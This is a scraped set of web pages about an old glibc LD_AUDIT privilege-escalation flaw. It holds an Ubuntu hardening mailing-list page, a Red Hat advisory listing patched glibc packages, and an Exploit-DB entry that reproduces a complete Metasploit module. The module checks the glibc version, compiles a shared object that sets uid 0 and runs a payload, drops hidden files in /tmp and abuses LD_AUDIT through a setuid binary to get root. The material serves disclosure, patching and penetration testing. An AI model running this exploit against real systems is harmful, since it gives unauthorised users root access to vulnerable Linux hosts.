[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from lists.ubuntu.com_be8ed54b_20250126_124103.html ===


| **ubuntu-hardened -- Ubuntu security discussion** | |
| --- | --- |
|  | |
| **About ubuntu-hardened** | English (USA)   Chinese (Taiwan) |
| Discussion on Ubuntu security updates, development of new security technologies, and general "hardening" of the operating system.  A place to talk about MAC systems (SELinux, AppArmor, Smack) in Ubuntu, about both kernel-level and user-land security improvements and technologies, etc.  To see the collection of prior postings to the list, visit the [ubuntu-hardened Archives](https://lists.ubuntu.com/archives/ubuntu-hardened). | |
| **Using ubuntu-hardened** | |
| To post a message to all the list members, send email to ubuntu-hardened@lists.ubuntu.com. You can subscribe to the list, or change your existing subscription, in the sections below. | |
| **Subscribing to ubuntu-hardened** | |
| Subscribe to ubuntu-hardened by filling out the following form. You will be sent email requesting confirmation, to prevent others from gratuitously subscribing you. This is a hidden list, which means that the list of members is available only to the list administrator.    | Your email address: |  |  | | --- | --- | --- | | Your name (optional): |  |  | | You may enter a privacy password below. This provides only mild security, but should prevent others from messing with your subscription. **Do not use a valuable password** as it will occasionally be emailed back to you in cleartext. If you choose not to enter a password, one will be automatically generated for you, and it will be sent to you once you've confirmed your subscription. You can always request a mail-back of your password when you edit your personal options. | | | | Pick a password: |  |  | | Reenter password to confirm: |  |  | | Which language do you prefer to display your messages? | English (USA)   Chinese (Taiwan) |  | | Would you like to receive list mail batched in a daily digest? | No  Yes | |  | | | | |

| **ubuntu-hardened Subscribers** | |
| (*The subscribers list is only available to the list administrator.*) Enter your admin address and password to visit the subscribers list: Admin address: Password:  To unsubscribe from ubuntu-hardened, get a password reminder, or change your subscription options enter your subscription email address: If you leave the field blank, you will be prompted for your email address | |

---

[ubuntu-hardened](../listinfo/ubuntu-hardened) list run by jamie at ubuntu.com, mdeslaur at ubuntu.com, sbeattie at ubuntu.com, alex.murray at canonical.com
[ubuntu-hardened administrative interface](../admin/ubuntu-hardened) (requires authorization)
[Overview of all lists.ubuntu.com mailing lists](../listinfo)

| [Delivered by Mailmanversion 2.1.20](http://www.gnu.org/software/mailman/index.html) | [Python Powered](http://www.python.org/) | [GNU's Not Unix](http://www.gnu.org/) | [Debian Powered](http://www.debian.org/) |
| --- | --- | --- | --- |

[![](http://tuxedo-es.org/images/hardened_debian.png)](http://www.debian-hardened.org)



=== Content from www.exploit-db.com_c70f96e4_20250125_231159.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# glibc - 'LD\_AUDIT' Arbitrary DSO Load Privilege Escalation (Metasploit)

#### EDB-ID:

###### 44025

#### CVE:

###### [2010-3856](https://nvd.nist.gov/vuln/detail/CVE-2010-3856) [2010-3847](https://nvd.nist.gov/vuln/detail/CVE-2010-3847)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2018-02-12

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Linux

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation',
      'Description'    => %q{
        This module attempts to gain root privileges on Linux systems by abusing
        a vulnerability in the GNU C Library (glibc) dynamic linker.

        glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not
        properly restrict use of the LD_AUDIT environment variable when loading
        setuid executables. This allows loading arbitrary shared objects from
        the trusted library search path with the privileges of the suid user.

        This module uses LD_AUDIT to load the libpcprofile.so shared object,
        distributed with some versions of glibc, and leverages arbitrary file
        creation functionality in the library constructor to write a root-owned
        world-writable file to a system trusted search path (usually /lib).
        The file is then overwritten with a shared object then loaded with
        LD_AUDIT resulting in arbitrary code execution.

        This module has been tested successfully on glibc version 2.11.1 on
        Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386.

        RHEL 5 is reportedly affected, but untested. Some glibc distributions
        do not contain the libpcprofile.so library required for successful
        exploitation.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Tavis Ormandy', # Discovery and exploit
          'zx2c4',         # "I Can't Read and I Won't Race You Either" exploit
          'Marco Ivaldi',  # raptor_ldaudit and raptor_ldaudit2 exploits
          'Todor Donev',   # libmemusage.so exploit
          'Brendan Coles'  # Metasploit
        ],
      'DisclosureDate' => 'Oct 18 2010',
      'Platform'       => 'linux',
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        =>
        [
          [ 'Automatic', { } ],
          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],
          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]
        ],
      'DefaultTarget'  => 0,
      'References'     =>
        [
          [ 'CVE', '2010-3847' ],
          [ 'CVE', '2010-3856' ],
          [ 'BID', '44154' ],
          [ 'BID', '44347' ],
          [ 'EDB', '15274' ],
          [ 'EDB', '15304' ],
          [ 'EDB', '18105' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2010/Oct/257' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2010/Oct/344' ],
          [ 'URL', 'https://www.ubuntu.com/usn/usn-1009-1' ],
          [ 'URL', 'https://security-tracker.debian.org/tracker/CVE-2010-3847' ],
          [ 'URL', 'https://security-tracker.debian.org/tracker/CVE-2010-3856' ],
          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2010-3847' ],
          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2010-3856' ]
        ]
    ))
    register_options(
      [
        OptString.new('SUID_EXECUTABLE', [ true, 'Path to a SUID executable', '/bin/ping' ]),
        OptString.new('WritableDir',     [ true, 'A directory where we can write files', '/tmp' ])
      ])
  end

  def base_dir
    datastore['WritableDir']
  end

  def suid_exe_path
    datastore['SUID_EXECUTABLE']
  end

  def check
    glibc_banner = cmd_exec 'ldd --version'
    glibc_version = Gem::Version.new glibc_banner.scan(/^ldd\s+\(.*\)\s+([\d\.]+)/).flatten.first
    if glibc_version.to_s.eql? ''
      vprint_error 'Could not determine the GNU C library version'
      return CheckCode::Safe
    elsif glibc_version >= Gem::Version.new('2.12.2') ||
          (glibc_version >= Gem::Version.new('2.11.3') && glibc_version < Gem::Version.new('2.12'))
      vprint_error "GNU C Library version #{glibc_version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "GNU C Library version #{glibc_version} is vulnerable"

    lib = 'libpcprofile.so'
    @lib_dir = nil
    vprint_status "Checking for #{lib} in system search paths"
    search_paths = cmd_exec "env -i LD_PRELOAD=#{rand_text_alpha rand(10..15)} LD_DEBUG=libs env 2>&1 | grep 'search path='"
    search_paths.split('path=')[1..-1].join.split(':').each do |path|
      lib_dir = path.to_s.strip
      next if lib_dir.eql? ''
      libs = cmd_exec "ls '#{lib_dir}'"
      if libs.include? lib
        @lib_dir = lib_dir
        break
      end
    end
    if @lib_dir.nil?
      vprint_error "Could not find #{lib}"
      return CheckCode::Safe
    end
    vprint_good "Found #{lib} in #{@lib_dir}"

    unless setuid? suid_exe_path
      vprint_error "#{suid_exe_path} is not setuid"
      return CheckCode::Detected
    end
    vprint_good "#{suid_exe_path} is setuid"

    CheckCode::Appears
  end

  def upload_and_chmodx(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    cmd_exec "chmod +x '#{path}'"
    register_file_for_cleanup path
  end

  def on_new_session(client)
    # remove root owned shared object from system load path
    if client.type.eql? 'meterpreter'
      client.core.use 'stdapi' unless client.ext.aliases.include? 'stdapi'
      client.fs.file.rm @so_path
    else
      client.shell_command_token "rm #{@so_path}"
    end
  end

  def exploit
    check_status = check

    if check_status == CheckCode::Appears
      print_good 'The target appears to be vulnerable'
    elsif check_status == CheckCode::Detected
      fail_with Failure::BadConfig, "#{suid_exe_path} is not suid"
    else
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    payload_name = ".#{rand_text_alphanumeric rand(5..10)}"
    payload_path = "#{base_dir}/#{payload_name}"

    # Set target
    uname = cmd_exec 'uname -m'
    vprint_status "System architecture is #{uname}"
    if target.name.eql? 'Automatic'
      case uname
      when 'x86_64'
        my_target = targets[2]
      when /x86/, /i\d86/
        my_target = targets[1]
      else
        fail_with Failure::NoTarget, 'Unable to automatically select a target'
      end
    else
      my_target = target
    end
    print_status "Using target: #{my_target.name}"

    cpu = nil
    case my_target['Arch']
    when ARCH_X86
      cpu = Metasm::Ia32.new
    when ARCH_X64
      cpu = Metasm::X86_64.new
    else
      fail_with Failure::NoTarget, 'Target is not compatible'
    end

    # Compile shared object
    so_stub = %|
      extern int setuid(int);
      extern int setgid(int);
      extern int system(const char *__s);

      void init(void) __attribute__((constructor));

      void __attribute__((constructor)) init() {
        setuid(0);
        setgid(0);
        system("#{payload_path}");
      }
    |

    begin
      so = Metasm::ELF.compile_c(cpu, so_stub).encode_string(:lib)
    rescue
      print_error "Metasm encoding failed: #{$ERROR_INFO}"
      elog "Metasm encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}"
      elog "Call stack:\n#{$ERROR_INFO.backtrace.join "\n"}"
      fail_with Failure::Unknown, 'Metasm encoding failed'
    end

    # Upload shared object
    so_name = ".#{rand_text_alphanumeric rand(5..10)}"
    so_path = "#{base_dir}/#{so_name}"
    upload_and_chmodx so_path, so

    # Upload exploit
    @so_path = "#{@lib_dir}/#{so_name}.so"
    exp = %(
      umask 0
      LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="#{@so_path}" #{suid_exe_path} 2>/dev/null
      umask 0022
      cat #{so_path} > #{@so_path}
      LD_AUDIT="#{so_name}.so" #{suid_exe_path}
      echo > #{@so_path}
    )
    exp_name = ".#{rand_text_alphanumeric rand(5..10)}"
    exp_path = "#{base_dir}/#{exp_name}"
    upload_and_chmodx exp_path, exp

    # Upload payload
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status 'Launching exploit...'
    # The echo at the end of the command is required
    # else the original session may die
    output = cmd_exec "#{exp_path}& echo "
    output.each_line { |line| vprint_status line.chomp }
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)
[Local](/?tag=22)

**Advisory/Source:**
[Link](https://raw.githubusercontent.com/rapid7/metasploit-framework/cb1b59545b1378be9e781787b028fee03d734f58/modules/exploits/linux/local/glibc_ld_audit_dso_load_priv_esc.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from rhn.redhat.com_e191d77f_20250126_124114.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2010:0793 - Security Advisory

Issued:
2010-10-25
Updated:
2010-10-25
# RHSA-2010:0793 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: glibc security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2010%3A0793)

## Topic

Updated glibc packages that fix one security issue are now available for
Red Hat Enterprise Linux 5.

The Red Hat Security Response Team has rated this update as having
important security impact. A Common Vulnerability Scoring System (CVSS)
base score, which gives a detailed severity rating, is available from the
CVE link in the References section.

## Description

The glibc packages contain the standard C libraries used by multiple
programs on the system. These packages contain the standard C and the
standard math libraries. Without these two libraries, a Linux system cannot
function properly.

It was discovered that the glibc dynamic linker/loader did not perform
sufficient safety checks when loading dynamic shared objects (DSOs) to
provide callbacks for its auditing API during the execution of
privileged programs. A local attacker could use this flaw to escalate
their privileges via a carefully-chosen system DSO library containing
unsafe constructors. (CVE-2010-3856)

Red Hat would like to thank Ben Hawkes and Tavis Ormandy for reporting this
issue.

All users should upgrade to these updated packages, which contain a
backported patch to correct this issue.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<http://kbase.redhat.com/faq/docs/DOC-11259>

## Affected Products

* Red Hat Enterprise Linux Server 5 x86\_64
* Red Hat Enterprise Linux Server 5 ia64
* Red Hat Enterprise Linux Server 5 i386
* Red Hat Enterprise Linux Workstation 5 x86\_64
* Red Hat Enterprise Linux Workstation 5 i386
* Red Hat Enterprise Linux Desktop 5 x86\_64
* Red Hat Enterprise Linux Desktop 5 i386
* Red Hat Enterprise Linux for IBM z Systems 5 s390x
* Red Hat Enterprise Linux for Power, big endian 5 ppc
* Red Hat Enterprise Linux Server from RHUI 5 x86\_64
* Red Hat Enterprise Linux Server from RHUI 5 i386

## Fixes

* [BZ - 645672](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=645672)
  - CVE-2010-3856 glibc: ld.so arbitrary DSO loading via LD\_AUDIT in setuid/setgid programs

## CVEs

* [CVE-2010-3856](https://www.redhat.com/security/data/cve/CVE-2010-3856.html)

## References

* <http://www.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Enterprise Linux Server 5

| SRPM | |
| --- | --- |
| glibc-2.5-49.el5\_5.7.src.rpm | SHA-256: 82e1d65b99db67bc6a14e59303c77994228e36900b52389e975bc4a3e782dca1 |
| x86\_64 | |
| glibc-2.5-49.el5\_5.7.i686.rpm | SHA-256: 47e05605373ed022365b7afa28ec48bafd26dde96c598f9f1c5f9d6eb4bf434d |
| glibc-2.5-49.el5\_5.7.x86\_64.rpm | SHA-256: ec59cbd5782c9d74f6697528c5457644dd9d198a7fe5e27202ac6541d9d0aab8 |
| glibc-common-2.5-49.el5\_5.7.x86\_64.rpm | SHA-256: 5404aed72f229163ddf0b68098f9c7e4399b482a1d116fc70218daa690ad8ec3 |
| glibc-devel-2.5-49.el5\_5.7.i386.rpm | SHA-256: ffb7784f701a108ca9c9079d8afecdbc6659c651e9763d294f1e5c179d140435 |
